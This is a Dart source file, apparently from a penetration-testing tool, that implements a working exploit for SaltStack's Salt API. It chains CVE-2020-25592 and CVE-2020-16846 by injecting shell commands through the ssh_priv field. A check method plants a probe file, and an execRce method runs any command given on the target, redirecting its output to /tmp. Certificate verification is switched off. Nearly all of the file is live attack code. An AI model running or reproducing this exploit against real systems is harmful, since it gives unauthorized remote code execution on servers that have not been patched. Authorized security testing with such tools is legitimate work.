import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';

import 'exp_result.dart';

class SaltstackExpService {
  final String baseUrl;
  final String token;
  final Duration timeout;

  SaltstackExpService({
    required this.baseUrl,
    required this.token,
    this.timeout = const Duration(seconds: 10),
  });

  // Salt API 使用 HTTPS 自签证书，必须跳过证书验证
  http.Client _client() {
    final ioClient = HttpClient()
      ..badCertificateCallback = (_, _, _) => true;
    return IOClient(ioClient);
  }

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    final client = _client();
    try {
      // 探针命令必须无 stdout 输出：echo 的输出会被 Salt 当作 SSH key 内容解析，
      // 导致 500；用 touch 静默写文件，服务端正常返回 200 + {"return":[{}]}。
      // CVE-2020-25592 允许无 token 调用 SSH 模块；CVE-2020-16846 实现 ssh_priv 注入。
      final probe = 'touch /tmp/salt_matrix_check_${DateTime.now().millisecondsSinceEpoch}';
      final sshPrivValue = 'aaa|$probe;';
      final body = 'token=${Uri.encodeComponent(token)}&client=ssh&tgt=*&fun=a&roster=whip1ash'
          '&ssh_priv=${Uri.encodeComponent(sshPrivValue)}';
      final res = await client
          .post(
            Uri.parse('$_base/run'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: body,
          )
          .timeout(timeout);
      if (res.statusCode == 200 && res.body.contains('"return"')) {
        return ExpResult(
          true,
          'CVE-2020-16846',
          'SSH 模块未授权可达且 ssh_priv 注入成功，响应: ${res.body}',
        );
      }
      final hint = res.statusCode == 401 ? 'HTTP 401 Unauthorized（需要有效 token）' : 'HTTP ${res.statusCode}';
      return ExpResult(false, 'CVE-2020-16846', hint);
    } catch (e) {
      return ExpResult(false, 'CVE-2020-16846', '请求异常: $e');
    } finally {
      client.close();
    }
  }

  Future<String?> execRce(String cmd) async {
    final client = _client();
    try {
      // stdout 输出不能直接出现在 ssh_priv 注入流中（会被 Salt 当 SSH key 解析 → 500），
      // 重定向到 /tmp/matrix_rce_out 后静默执行可得到 200。
      final sshPrivValue = 'aaa|$cmd>/tmp/matrix_rce_out 2>&1;';
      final body = 'token=${Uri.encodeComponent(token)}&client=ssh&tgt=*&fun=a&roster=whip1ash'
          '&ssh_priv=${Uri.encodeComponent(sshPrivValue)}';
      final res = await client
          .post(
            Uri.parse('$_base/run'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: body,
          )
          .timeout(timeout);
      if (res.statusCode == 200) {
        return '[盲注 RCE] 命令已执行，输出已写入目标 /tmp/matrix_rce_out\n服务端响应: ${res.body}';
      }
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    } finally {
      client.close();
    }
  }
}
